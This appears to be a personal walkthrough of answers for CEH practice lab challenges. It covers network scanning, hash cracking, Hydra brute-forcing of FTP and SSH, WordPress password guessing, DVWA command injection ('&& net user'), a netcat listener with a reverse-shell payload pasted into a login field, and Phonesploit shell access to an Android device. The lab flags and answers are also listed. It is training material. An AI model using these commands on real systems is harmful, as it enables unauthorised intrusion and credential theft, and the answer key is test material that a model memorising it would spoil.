# Practice Engage

https://github.com/3ls3if/Cybersecurity-Notes/tree/main/readme/ceh-engage-walkthrough

---

## Challenge 1

**Challenge** 1

[https://centralops.net/co/](https://centralops.net/co/)
get ip of webserver

https://viewdns.info/iplocation/

found location from here.

37.751, -97.822

**Challenge** 2

[https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/)

use this and found no zone transfer 

No

**Challenge** 3

nmap -F 172.16.0.0/24

3 machine’s ports are scanned but one’s port is not scanned so it is something like firewall 

3

**Challenge** 4

```bash
nmap -F 172.16.0.0/24
```

172.16.0.12

**Challenge 5**

```jsx
nmap --script smb-os-discovery.nse 10.10.10.0/24
```

10.10.10.25

**Challenge 6**

```bash
nmap --script smb-os-discovery.nse 10.10.10.0/24
```

ADMINDEPT\x00

**Challenge 7**

```bash
nmap --script smb-os-discovery.nse 10.10.10.0/24
```

AdminDept.CEHORG.com

**Challenge 8**

```bash
nmap --script smb-os-discovery.nse 10.10.10.0/24
```

AdminDept.CEHORG.com

**Challenge 9**

```bash
nmap -sV -v -p 22 192.168.0.0/24
```

8.9p1

**Challenge 10**

```bash
nmap -sV -v 192.168.0.55
```

Ubuntu

**Challenge 11**

using ldapsearch

```bash
ldapsearch -x -H ldap://<LDAP-IP>:389 -b "dc=cehorg,dc=com" "(objectClass=person)"
```

we found 9 entries but one is DC is this

8

**Challenge 12**

using ldapsearch

```bash
ldapsearch -x -H ldap://<LDAP-IP>:389 -b "dc=cehorg,dc=com" "(objectClass=person)"
```

this also shows this details

LDAPv3

**Challenge 13**

```bash
nmap -sV -v -p 2049 192.168.0.0/24
```

192.168.0.51

**Challenge 14**

```bash
dig ns www.certifiedhacker.com
```

[ns1.bluehost.com](http://ns1.bluehost.com/), [ns2.bluehost.com](http://ns2.bluehost.com/)

**Challenge 15**

```bash
nmap -sV -v -p 25,587 192.168.0.0/24
```

192.168.0.51

**Challenge 16**

```bash
nmap -p 445 --script smb2-security-mode.nse 192.168.0.51
```

Yes

**Challenge 17**

search on CVE database

5.5 Medium

**Challenge 18**

used OpenVas to find medium vuln

3

**Challenge 19**

used OpenVas to find RPC vuln

**Challenge 20**

used OpenVas to find medium vuln

7

---

## Challenge 2

Challenge 1

```bash
john --format=NT /home/attacker/Desktop/Wordlist/password.txt ./password.txt
```

qwerty

Challenge 2

```bash
john --format=NT /home/attacker/Desktop/Wordlist/password.txt ./password.txt
```

12345678

Challenge 3

 L0phtCrack 

password4

Challenge 4

```powershell
snow.exe -C filename.ext
```

James/Hopkins13456

Challenge 5

used Opensteg

USD1234567

Challenge 6

Wireshark is used 

R3@D_M3

Challenge 7

Bintext is used 

DC14

Challenge 8

Ghidra is used

AARCH64

Challenge 9

**Windows Service Manager (SrvMan)**

Yes

Challenge 10

**Windows Service Manager (SrvMan)**

driver

Challenge 11

Using **Yersinia**

```bash
Yersinia -I
```

press F2 and then press x (for help press h)

see using wirshark

0x643c9869

Challenge 12

By using wireshark

ARP

Challenge 13

By using wireshark

0xfc83

Challenge 14

using wireshark

http.request.method==POST

Jason/welcome

Challenge 15

using waireshark

600

Challenge 16

using Wireshark

192.168.0.51

Challenge 17

---

## Challenge 3

Challenge 1

using wireshark

analyze >> export information (duplicattion of ip)

ARP

Challenge 2

whatweb tool is used  (other tools **BillCipher**)

1.25.5

Challenge 3
`nmap -p 21 172.16.0.0/24`
then used hydra 
`hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12`

then ftp IP for login

then get flag.txt 

Secrets@FTP

Challenge 4

Telnet  <ip> <port> 

then right GET / HTTP/1.0

"8d13646dbb9bd61:0”

Challenge 5

using wig
`wig www.cehorg.com`

WordPress

Challenge 6

Telnet  <ip> <port> 

then right GET / HTTP/1.0

Microsoft-IIS/10.0

Challenge 7

OWASP-zap is used 

6

Challenge 8

ldb [eccouncil.org](http://eccouncil.org/)

cloudflare

Challenge 9
`wpscan --url http://cehorg.com/wp-login.php -U adam -P <password.txt>`

orange1234

Challenge 10

by using this username and password (Jason/welcome) I performed IDOR 

Linda

Challenge 11

![{577BE4D0-0842-44A2-844E-38634615A0D1}.png](Practice%20Engage/577BE4D0-0842-44A2-844E-38634615A0D1.png)

9

Challenge 12

Challenge 13

at dvwa site on selection command injection

127.0.0.1 && C:\wamp64\www\DVWA\hackable\uploads\Hash.txt

got the hash

[https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) 

Cr@ck3d

Challenge 14

command injection in dvwa site

127.0.0.1 && net user

8

Challenge 15

```
nmap -p 8080 172.16.0.0/24

nmap -p 8080 10.10.10.0/24

nmap -p 8080 192.168.0.0/24

```

**Extract and Setup Jdk**

```
tar -xf jdk-8u202-linux-x64.tar.gz

mv jdk1.8.0_202 /usr/bin

```

**Update the JDK Path in the Poc.py file**

{% hint style="info" %} Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"

Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"

Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java" {% endhint %}

**Create a Netcat Listener**

```
nc -lvp 9001

```

**Create a Payload**

```
python3 poc.py --userip 10.10.1.13 --webport 8080 --lport 9001

```

{% hint style="info" %} Copy the send me payload and paste in the username field and enter any random password and press Login {% endhint %}

Ch@mp2022

---

# Challenge 4

Challenge 1

used wireshark >>analyze >>export info

Warning

Challenge 2

first used phonesploit

python3 phonesploit.py

press 3 >> IP (172.16.0.21) then 

>>press p >> press 24 >> write same IP on device name 

then on 75 we got the answer

APOSTROPHE

Challenge 3

on phonesploit >>press 4  to access shell

in file from folder >>/sdcard/Downloads/confidential.txt I found answer

80099889

Challenge 4

![{70D58570-4274-4807-B69C-E13D165BC744}.png](Practice%20Engage/70D58570-4274-4807-B69C-E13D165BC744.png)

172.16.0.11/HTTP

Challenge 5

using https://sisik.eu/apk-tool

Yes 

Challenge 6

using wireshark

Fleet_Count

Challenge 7

using wireshark

Data Bre@ch @lert

Challenge 8

Using HashCalc

Quotes

Challenge 9

Using BCTextEncoder  with password

10.10.10.31

Challenge 10

Using  Advance Encryption Package with password

ECC-CSC-2006

Challenge 11

Using VeraCrypt with password

6

Challenge 12

![{D7644174-A72A-44EB-BF25-CE3E78621679}.png](Practice%20Engage/D7644174-A72A-44EB-BF25-CE3E78621679.png)

![{A0279A4B-F29E-4E62-B2E1-595949B00BE5}.png](Practice%20Engage/A0279A4B-F29E-4E62-B2E1-595949B00BE5.png)

Twofish/@!ph@|tE*t

---

# Step 1: Brute-force SSH credentials

hydra -l martin -P /path/to/password/list.txt ssh://192.168.10.101

# Step 2: Access the SMB share

smbclient [//192.168.10.101/C$](https://192.168.10.101/C$) -U martin

# Step 3: Navigate to the Desktop

cd Users/Martin/Desktop

# Step 4: Retrieve the file

ls
get webpent.txt

# Step 5: Analyze the file

cat webpent.txt

# Step 6: Extract the Meta-Author

curl [https://target-site.com](https://target-site.com/) | grep -i '<meta name="author"'

# Step 1: Connect to the Users share

smbclient [//192.168.10.101/Users](https://192.168.10.101/Users) -U martin

# Step 2: Navigate to the Desktop folder

cd martin/Desktop

# Step 3: List files and download webpent.txt

ls
get webpent.txt

after ssh 

used dir /a:h

---

1. **List all installed packages**:
    
    ```
    adb shell pm list packages
    ```
    
    This command lists all installed packages on the device.
    
2. **Extract APK files**:
    
    ```
    adb shell pm path com.example.package | cut -d':' -f2 | xargs adb pull
    ```
    
    Replace **`com.example.package`** with the actual package name. Repeat this for each package.
    

### **Step 2: Extract CRC Values from APK Files**

Once you have the APK files, you can use tools like **`zip`** (since APK files are essentially ZIP archives) to extract the contents and calculate CRC values.

### **Commands:**

1. **Extract the contents of an APK file**:
    
    ```
    unzip example.apk -d extracted_apk
    ```
    
    Replace **`example.apk`** with the actual APK file name.
    
2. **Calculate CRC values**:
You can use a tool like **`crc32`** to calculate the CRC values of the files within the APK.
    
    ```
    find extracted_apk -type f -exec crc32 {} \; | grep 614c
    ```